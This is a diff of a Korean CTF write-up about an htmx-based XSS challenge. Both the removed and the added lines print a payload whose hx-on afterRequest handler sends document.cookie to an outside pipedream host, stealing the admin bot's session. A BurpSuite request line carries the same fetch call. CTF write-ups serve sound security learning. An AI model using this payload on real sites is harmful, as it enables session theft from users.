@@ -157,13 +157,15 @@ async fn take_report(Form(report): Form<Report>) -> Result<String, (StatusCode, 
 `BurpSuite Proxy`를 사용해서 Request를 살펴봤을 때, `GET /note/fetch('https://enbjsc6lizc3g.x.pipedream.net/?d=%27+document.cookie)56445d0ed2630d386f3f33a1d46224ade75d071f701de79cd67eec9c5d18f01256445d0ed2630d386f3f33a1d46224ade75d071f701de79cd67eec9c5d18f012 HTTP/2` 요청을 보내 fetch() 이후 note 이름이 합쳐져 올바르지 않은 경로로 접근하여 실행되지 않는 것을 확인했다. 여기서 외부 사이트에 요청을 보내는 방법을 찾지 못해 삽질을 많이해서 대회 당시에 문제를 풀지 못했다.    
        
 https://htmx.org/events/
-```
+`
 Event - htmx:afterRequest
 This event is triggered after an AJAX request has finished either in the case of a successful request (although one that may have returned a remote error code such as a 404) or in a network error situation. This event can be paired with htmx:beforeRequest to wrap behavior around a request cycle.
-```
+`
 대회가 끝나고, write-up을 보니 `htmx:afterRequest`를 사용한 풀이가 있었다. `htmx:afterRequest`는 AJAX 요청 이후 Request를 한 번 더 전송하는 속성으로 Payload는 아래와 같았다.     
       
-`<div hx-get="/api/note/01fe5e3e71de0713da71533027bf0e267e6661f8fba78e04711521a28577285c" hx-trigger="load" hx-target="this" hx-on="htmx:afterRequest: fetch('https://enbjsc6lizc3g.x.pipedream.net/?d='+document.cookie)"></div>`   
+```html
+<div hx-get="/api/note/01fe5e3e71de0713da71533027bf0e267e6661f8fba78e04711521a28577285c" hx-trigger="load" hx-target="this" hx-on="htmx:afterRequest: fetch('https://enbjsc6lizc3g.x.pipedream.net/?d='+document.cookie)"></div>
+```   
 
 거의 다 왔는데 `hx-get` 요청 이후 `htmx:afterRequest`가 수행되며 쿠키 값을 전달한다. 즉, 위 내용을 Note의 입력 값으로 전달하고 Report를 통해 adminbot이 읽게 하면 아래와 같이 세션을 탈취할 수 있게 된다. 
      
